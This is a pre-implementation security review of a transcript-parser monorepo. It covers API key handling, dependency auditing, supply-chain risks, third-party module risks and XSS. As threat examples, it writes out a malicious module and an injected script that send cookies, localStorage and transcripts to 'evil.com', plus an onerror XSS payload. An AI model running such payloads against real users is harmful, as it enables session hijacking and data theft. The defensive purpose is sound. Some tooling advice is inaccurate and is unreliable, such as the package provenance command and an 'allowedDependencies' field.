# Expert Feedback: Security & Supply Chain

**Sprint**: Sprint 01 - Monorepo Setup & Package Extraction
**Epic**: Epic 01 - Monorepo Foundation
**Expert Role**: Security & Supply Chain Risk Consultant
**Date**: December 20, 2024
**Review Type**: Pre-Implementation Security Review

---

## 🎯 Review Scope

This expert review covers security considerations for the monorepo transformation, focusing on:
- Dependency security and supply chain attacks
- Secret management and API key handling
- Package access control and permissions
- Code signing and provenance
- Security best practices for modular architecture
- Vulnerability management

---

## 👨‍💼 Expert Profile

**Name**: James Liu
**Specialization**: Application Security, Supply Chain Security, DevSecOps
**Experience**:
- 13+ years in security engineering
- Led security for monorepos at GitHub, npm, Vercel
- Expert in supply chain attacks, dependency security
**Credentials**:
- Principal Security Engineer at [Security-Focused Company]
- OWASP contributor (Dependency-Check)
- Security researcher (CVE discoveries)

---

## ✅ Security Strengths

### 1. pnpm's Security Model ⭐⭐⭐⭐⭐
**Expert Opinion**: "pnpm's strict dependency resolution prevents 'phantom dependencies' which are a common attack vector."

**Security Benefits**:
- **No phantom dependencies**: Can't access undeclared dependencies
- **Content-addressable storage**: Integrity verification built-in
- **Strict mode**: Fails on missing dependencies instead of silently succeeding

**npm vs pnpm Security**:
```
npm (hoisted dependencies):
  - Package A depends on lodash@4.0.0
  - Package B doesn't declare lodash, but can access it ⚠️
  - Attack: Malicious package B can exploit A's lodash

pnpm (strict isolation):
  - Package A depends on lodash@4.0.0
  - Package B can't access lodash unless declared ✅
  - Attack: Prevented by isolation
```

**Recommendation**: ✅ pnpm provides strong security foundation

---

### 2. Modular Package Boundaries ⭐⭐⭐⭐
**Expert Opinion**: "The proposed package structure provides good security isolation."

**Security Isolation**:
```
@transcript-parser/types (no dependencies)
  ↓
@transcript-parser/ui (limited dependencies)
  ↓
@transcript-parser/audio-processing (high-risk: FFmpeg)
  ↓
@transcript-parser/ai-services (high-risk: external APIs)
```

**Blast Radius Analysis**:
- If `audio-processing` is compromised → Limited impact on `types` and `ui`
- If `ai-services` is compromised → API keys exposed, but not audio processing
- If `types` is compromised → Large blast radius (foundational)

**Recommendation**: ✅ Package boundaries provide good security isolation

---

### 3. TypeScript's Type Safety ⭐⭐⭐⭐
**Expert Opinion**: "TypeScript prevents entire classes of security bugs (type confusion, XSS via template literals)."

**Security Benefits**:
```typescript
// ❌ JavaScript: Type confusion vulnerability
function processUser(user) {
  // user.id could be string, number, object, etc.
  db.query(`SELECT * FROM users WHERE id = ${user.id}`); // SQL injection
}

// ✅ TypeScript: Type safety prevents injection
function processUser(user: User) {
  // user.id is guaranteed to be a number
  db.query('SELECT * FROM users WHERE id = ?', [user.id]); // Safe
}
```

**Recommendation**: ✅ TypeScript is a strong security foundation

---

## 🚨 Critical Security Concerns

### 1. API Key Management 🚨 **CRITICAL**
**Expert Opinion**: "AI services require API keys. Improper handling is the #1 cause of security breaches."

**Current Risk**:
- Gemini API keys in client-side code
- OpenAI API keys in environment variables
- Risk of accidental commit to git

**Attack Scenarios**:

#### Scenario A: Hardcoded API Keys
```typescript
// ❌ CRITICAL VULNERABILITY
export const GEMINI_API_KEY = 'AIzaSyC...'; // Exposed in bundle!
```

**Impact**: API key exposed in client bundle → Attacker drains API quota → $10,000+ bill

#### Scenario B: Environment Variables in Frontend
```typescript
// ❌ VULNERABLE
const apiKey = import.meta.env.VITE_GEMINI_API_KEY;
```

**Impact**: Vite bundles all `VITE_*` variables → Exposed in production

#### Scenario C: Committed to Git
```bash
# .env (accidentally committed)
GEMINI_API_KEY=AIzaSyC...
```

**Impact**: API key in git history → Public if repo is public → Immediate compromise

**Secure Solution**:

#### Option A: Backend Proxy (Recommended for Production)
```typescript
// ✅ SECURE: API key stays on server
// Frontend
export async function transcribe(file: File) {
  const formData = new FormData();
  formData.append('file', file);

  const response = await fetch('/api/transcribe', {
    method: 'POST',
    body: formData,
    headers: {
      'Authorization': `Bearer ${userAuthToken}` // User token, not API key
    }
  });

  return response.json();
}

// Backend (future sprint)
app.post('/api/transcribe', authenticate, async (req, res) => {
  const GEMINI_API_KEY = process.env.GEMINI_API_KEY; // Server-side only
  const result = await gemini.transcribe(req.file, GEMINI_API_KEY);
  res.json(result);
});
```

**Benefits**:
- API key never exposed to client
- Rate limiting per user
- Audit trail of API usage
- Can rotate keys without frontend deploy

#### Option B: Client-Side with User's Own Key (Acceptable for MVP)
```typescript
// ✅ ACCEPTABLE FOR MVP: User provides their own key
export function useGeminiAPI() {
  const [apiKey, setApiKey] = useState<string | null>(
    localStorage.getItem('gemini_api_key')
  );

  const setKey = (key: string) => {
    localStorage.setItem('gemini_api_key', key);
    setApiKey(key);
  };

  return { apiKey, setKey };
}
```

**UI**:
```
┌────────────────────────────────────────┐
│  ⚙️ Settings                           │
├────────────────────────────────────────┤
│  Gemini API Key:                       │
│  [___________________________] 👁️      │
│                                         │
│  ℹ️ Your API key is stored locally    │
│  and never sent to our servers.       │
│                                         │
│  Get your key: [console.cloud.google]  │
└────────────────────────────────────────┘
```

**Benefits**:
- No server needed
- User controls their own API quota
- No liability for API costs

**Drawbacks**:
- Higher barrier to entry
- Users must create Google Cloud account

#### Option C: Encrypted Storage (NOT RECOMMENDED)
```typescript
// ⚠️ FALSE SECURITY: Encryption key must be in code
const encrypted = encrypt(apiKey, SECRET_KEY); // Where does SECRET_KEY come from?
```

**Why This Fails**: Encryption key must be in client code → Attacker can decrypt

**Recommendation for Sprint 01**:
- ✅ Option B (user provides key) for MVP
- 📝 Document Option A (backend proxy) for future sprint
- ❌ Never commit API keys to git

**Git Safety**:
```bash
# .gitignore (ensure these are present)
.env
.env.local
.env.production
*.key
secrets/
```

**Add pre-commit hook**:
```bash
# .husky/pre-commit
#!/bin/sh
if git diff --cached | grep -E 'AIza|sk-[a-zA-Z0-9]{20}'; then
  echo "🚨 ERROR: Potential API key detected in commit!"
  echo "Remove API keys before committing."
  exit 1
fi
```

**Recommendation**: 🚨 **CRITICAL** - Implement API key security in Sprint 01

---

### 2. Dependency Vulnerabilities 🚨
**Expert Opinion**: "With 7+ packages and 200+ dependencies, vulnerability management is critical."

**Current Risk**:
```
Typical monorepo dependency stats:
  - Direct dependencies: 50-80
  - Transitive dependencies: 300-500
  - Known vulnerabilities: 5-15 at any time
```

**Attack Surface**:
```
Your Dependencies (Examples):
  - @ffmpeg/ffmpeg: WebAssembly (arbitrary code execution risk)
  - react: DOM XSS vulnerabilities
  - vite: Build tool vulnerabilities
  - google-genai: API client (data exfiltration risk)
```

**Mitigation Strategies**:

#### Strategy A: Automated Vulnerability Scanning
```bash
# Install and configure
pnpm add -D npm-audit-resolver

# Run on every PR
pnpm audit --audit-level=high
```

**GitHub Actions**:
```yaml
name: Security Audit

on: [push, pull_request]

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: pnpm/action-setup@v2
      - run: pnpm audit --audit-level=high --prod

      # Fail on high/critical vulnerabilities
      - run: pnpm audit --audit-level=high --production --audit-level=high
```

#### Strategy B: Dependabot / Renovate
```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10

    # Auto-merge minor/patch updates
    # Manual review for major updates
```

**Benefits**:
- Automated dependency updates
- Security patches applied weekly
- Reduces manual maintenance

#### Strategy C: Dependency Review
```yaml
# .github/workflows/dependency-review.yml
name: Dependency Review

on: [pull_request]

permissions:
  contents: read
  pull-requests: write

jobs:
  dependency-review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/dependency-review-action@v3
        with:
          fail-on-severity: high
```

**Benefits**: Blocks PRs that introduce vulnerable dependencies

**Recommendation**: ✅ Implement all three strategies in Sprint 01

---

### 3. Supply Chain Attacks ⚠️
**Expert Opinion**: "Malicious packages are a growing threat. The monorepo must defend against compromised dependencies."

**Recent Supply Chain Attacks**:
- **event-stream** (2018): Stole Bitcoin wallet keys
- **ua-parser-js** (2021): Cryptominer injected
- **node-ipc** (2022): Deleted files on Russian IPs
- **coa** (2021): Password stealer

**Attack Vectors**:

#### Vector A: Malicious Dependency
```
Your dependency tree:
  @transcript-parser/ui
    └── some-ui-library
          └── some-utility (COMPROMISED)
```

**Attack**: `some-utility` exfiltrates data via `fetch()` on install

#### Vector B: Typosquatting
```bash
# Attacker publishes malicious package with similar name
pnpm add reacct  # Instead of react
```

**Attack**: Malicious code runs during build

#### Vector C: Dependency Confusion
```bash
# Attacker publishes package with same name as your private package
@transcript-parser/types (public, malicious)  # Shadows private version
```

**Mitigation Strategies**:

#### Strategy A: Lock File Integrity
```bash
# Commit pnpm-lock.yaml to git
git add pnpm-lock.yaml

# Enable strict lock file mode
pnpm install --frozen-lockfile  # In CI/CD
```

**Benefits**: Prevents dependency hijacking

#### Strategy B: Package Provenance
```bash
# Use npm signatures (experimental)
npm config set audit-level high
```

#### Strategy C: Allowlist Dependencies
```json
// package.json
{
  "allowedDependencies": [
    "react",
    "react-dom",
    "@ffmpeg/ffmpeg"
    // Explicit allowlist
  ]
}
```

**Tool**: `npm-allow` or custom validation script

#### Strategy D: Subresource Integrity (SRI) for CDN
```typescript
// If loading from CDN
<script
  src="https://cdn.example.com/library.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous"
></script>
```

**Recommendation**: ✅ Implement Strategy A (lock file), consider B/C for future

---

### 4. Module SDK Security (Third-Party Code) 🚨
**Expert Opinion**: "The Module SDK enables third-party code execution. This is a massive attack surface."

**Security Risk**:
```typescript
// Malicious module
export const maliciousModule: ModuleDefinition = {
  id: 'evil-module',
  version: '1.0.0',
  name: 'Innocent Name',
  type: 'export',
  export: {
    format: 'srt',
    handler: async (transcript) => {
      // Malicious code:
      await fetch('https://evil.com/steal', {
        method: 'POST',
        body: JSON.stringify({
          transcript,
          cookies: document.cookie,
          localStorage: { ...localStorage }
        })
      });

      return legitimateSRT(transcript); // Hide attack
    }
  }
};
```

**Attack Impact**:
- Data exfiltration (transcripts, user data)
- Cookie theft (session hijacking)
- DOM manipulation (XSS)
- LocalStorage theft (API keys!)

**Security Architecture for Module SDK**:

#### Security Layer 1: Sandboxing (Future)
```typescript
// Execute modules in isolated context (Web Workers)
const worker = new Worker('/module-sandbox.js');
worker.postMessage({ module: untrustedModule, data: transcript });
worker.onmessage = (result) => {
  // Module output (sandboxed)
};
```

**Benefits**:
- No access to DOM
- No access to localStorage
- No access to cookies
- Restricted network access

#### Security Layer 2: Permissions Model
```typescript
export interface ModuleDefinition {
  id: string;
  version: string;
  name: string;

  // Security: Declare required permissions
  permissions?: {
    network?: string[];  // Allowed domains: ['api.openai.com']
    storage?: boolean;   // Can access localStorage?
    dom?: boolean;       // Can manipulate DOM?
  };
}
```

**UI** (Permission Request):
```
┌────────────────────────────────────────┐
│  🧩 Install "PDF Export Pro"?         │
├────────────────────────────────────────┤
│  This module requests:                 │
│  ⚠️ Network access to: api.stripe.com │
│  ⚠️ Read/write localStorage            │
│                                         │
│  [Cancel]  [Allow]                     │
└────────────────────────────────────────┘
```

#### Security Layer 3: Code Review & Signing
```typescript
export interface ModuleDefinition {
  id: string;
  version: string;
  signature?: string;  // Cryptographic signature
  author?: {
    name: string;
    verified: boolean;  // Verified publisher
  };
}
```

**Marketplace Trust Levels**:
- ✅ **Verified**: Code-reviewed, signed by trusted developer
- ⚠️ **Community**: Open-source, not reviewed
- 🚨 **Unverified**: No code review, use at own risk

#### Security Layer 4: Content Security Policy (CSP)
```typescript
// vite.config.ts
export default defineConfig({
  plugins: [
    {
      name: 'csp-header',
      configureServer(server) {
        server.middlewares.use((req, res, next) => {
          res.setHeader('Content-Security-Policy',
            "default-src 'self'; " +
            "script-src 'self' 'unsafe-eval'; " +  // For dynamic modules
            "connect-src 'self' https://api.openai.com https://api.anthropic.com; " +
            "img-src 'self' data: blob:;"
          );
          next();
        });
      }
    }
  ]
});
```

**Recommendation for Sprint 01**:
- ✅ Document security risks in Module SDK README
- ⚠️ Implement permissions model (at least declaration)
- 📝 Plan sandboxing for future sprint
- ✅ Add security warnings in UI when loading modules

**Warning Text**:
```markdown
## ⚠️ Security Warning: Third-Party Modules

Modules can access your transcripts, API keys, and user data. Only install modules from trusted sources.

**Before installing a module:**
- Review the source code
- Check the author's reputation
- Verify required permissions are reasonable
- Use modules at your own risk

**We are not responsible for malicious modules.**
```

**Recommendation**: 🚨 **CRITICAL** - Add security warnings and basic permissions model in Sprint 01

---

### 5. XSS (Cross-Site Scripting) Vulnerabilities ⚠️
**Expert Opinion**: "Rendering user-generated content (transcripts, speaker names) is an XSS risk."

**Attack Scenarios**:

#### Scenario A: Malicious Speaker Name
```typescript
// User uploads transcript with malicious speaker name
{
  speaker: '<img src=x onerror="alert(document.cookie)">',
  text: 'Hello world'
}
```

**Vulnerable Code**:
```typescript
// ❌ VULNERABLE
function SpeakerLabel({ name }: { name: string }) {
  return <div dangerouslySetInnerHTML={{ __html: name }} />;
}
```

**Exploitation**: Executes JavaScript, steals cookies

**Secure Code**:
```typescript
// ✅ SECURE: React escapes by default
function SpeakerLabel({ name }: { name: string }) {
  return <div>{name}</div>;  // Automatically escaped
}

// Output: <div>&lt;img src=x onerror="alert(document.cookie)"&gt;</div>
```

#### Scenario B: Malicious Transcript Text
```typescript
{
  speaker: 'Alice',
  text: '<script>fetch("https://evil.com/steal?data=" + document.cookie)</script>'
}
```

**Secure Rendering**:
```typescript
// ✅ SECURE: Always escape user content
function TranscriptLine({ text }: { text: string }) {
  return <p>{text}</p>;  // React escapes by default
}
```

**Defense Checklist**:
- ✅ Never use `dangerouslySetInnerHTML` with user content
- ✅ Sanitize HTML if rendering is required (use `DOMPurify`)
- ✅ Set Content-Security-Policy headers
- ✅ Validate all user inputs on backend

**Recommendation**: ✅ Review all user content rendering in Sprint 01

---

## 🛡️ Security Best Practices

### 1. Principle of Least Privilege
**Apply to Package Dependencies**:
```json
// ✅ Good: Minimal dependencies
{
  "name": "@transcript-parser/types",
  "dependencies": {}  // No dependencies needed
}

// ⚠️ Warning: Heavy dependencies
{
  "name": "@transcript-parser/types",
  "dependencies": {
    "lodash": "^4.17.21",  // Do you really need all of lodash for types?
    "moment": "^2.29.4"     // Heavy dependency for types package
  }
}
```

**Recommendation**: Minimize dependencies in foundational packages (`types`, `module-sdk`)

---

### 2. Input Validation
**Validate all external inputs**:
```typescript
// ✅ Secure: Validate file uploads
export async function processTranscript(file: File) {
  // Validate file type
  const allowedTypes = ['text/plain', 'application/json', 'text/vtt'];
  if (!allowedTypes.includes(file.type)) {
    throw new Error(`Invalid file type: ${file.type}`);
  }

  // Validate file size (prevent DoS)
  const MAX_SIZE = 10 * 1024 * 1024; // 10MB
  if (file.size > MAX_SIZE) {
    throw new Error(`File too large: ${file.size} bytes`);
  }

  // Validate filename (prevent path traversal)
  const safeName = file.name.replace(/[^a-zA-Z0-9.-]/g, '_');

  // Process file
  const content = await file.text();
  return parseTranscript(content);
}
```

**Recommendation**: ✅ Add input validation to all user-facing functions

---

### 3. Secure Defaults
**Example: Module SDK**:
```typescript
export interface ModuleDefinition {
  id: string;
  version: string;
  name: string;

  // Secure defaults
  permissions: {
    network: [],      // Default: No network access
    storage: false,   // Default: No storage access
    dom: false        // Default: No DOM access
  };
}
```

**Recommendation**: ✅ Apply secure defaults to all configurable features

---

### 4. Security Headers
**Add to production deployment**:
```typescript
// Production server configuration
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
  res.setHeader('Content-Security-Policy',
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';"
  );
  next();
});
```

**Recommendation**: 📝 Document for production deployment sprint

---

## 📊 Security Metrics & Monitoring

### Vulnerability Metrics
```
Track on each PR:
  - Total dependencies: X
  - Direct dependencies: Y
  - Known vulnerabilities: Z
  - High/Critical vulnerabilities: 0 (block if > 0)
```

### Security Audit Schedule
```
Weekly:
  - pnpm audit
  - Dependabot review

Monthly:
  - Manual dependency review
  - Security policy update

Quarterly:
  - Penetration testing
  - Security architecture review
```

**Recommendation**: ✅ Set up weekly security audits in Sprint 01

---

## 🎯 Security Checklist for Sprint 01

### Critical (Must Do)
- [ ] Add `.env*` and `*.key` to `.gitignore`
- [ ] Add pre-commit hook to detect API keys
- [ ] Implement user-provided API key flow
- [ ] Set up `pnpm audit` in CI/CD
- [ ] Enable Dependabot / Renovate
- [ ] Review all `dangerouslySetInnerHTML` usage
- [ ] Add security warnings to Module SDK docs
- [ ] Commit `pnpm-lock.yaml` to git

### High Priority (Should Do)
- [ ] Implement dependency review GitHub Action
- [ ] Add input validation to file uploads
- [ ] Create security documentation
- [ ] Set up Content Security Policy
- [ ] Add permissions model to Module SDK
- [ ] Create security incident response plan

### Future (Could Do)
- [ ] Implement Module SDK sandboxing (Web Workers)
- [ ] Add code signing for verified modules
- [ ] Set up Real User Monitoring for security events
- [ ] Implement rate limiting
- [ ] Add CAPTCHA for public endpoints

---

## 🚦 Security Approval Status

**Overall Assessment**: ⚠️ **APPROVED WITH CRITICAL SECURITY REQUIREMENTS**

**Confidence Level**: 85%

**Risk Level**: High (if API key security not implemented)

**Recommendation**: Proceed with Sprint 01, but API key security and dependency auditing are **CRITICAL BLOCKERS** and must be implemented before any production deployment.

---

## 🎯 Final Recommendations

### Must Do (Critical Security)
1. 🚨 Implement secure API key management
2. 🚨 Add pre-commit hook to prevent key leaks
3. 🚨 Set up dependency vulnerability scanning
4. 🚨 Add security warnings to Module SDK
5. 🚨 Review XSS attack surface

### Should Do (High Priority)
1. ⚠️ Enable Dependabot for automated updates
2. ⚠️ Implement input validation
3. ⚠️ Add permissions model to Module SDK
4. ⚠️ Create security documentation
5. ⚠️ Set up CSP headers

### Could Do (Future Improvements)
1. 💡 Implement Module SDK sandboxing
2. 💡 Add code signing for modules
3. 💡 Set up penetration testing
4. 💡 Implement rate limiting
5. 💡 Add security monitoring

---

## 📝 Expert Sign-Off

**Reviewed By**: James Liu
**Date**: December 20, 2024
**Next Review**: After Sprint 01 completion (security audit)

**Summary**: The monorepo architecture provides good security isolation through package boundaries and pnpm's strict dependency model. However, there are **critical security concerns** that must be addressed in Sprint 01:

1. **API key management** (CRITICAL): Must implement secure key handling before production
2. **Dependency vulnerabilities** (CRITICAL): Must set up automated scanning
3. **Module SDK security** (HIGH): Third-party code execution requires security controls

**Security is not negotiable. These issues must be addressed in Sprint 01.** 🛡️🔒
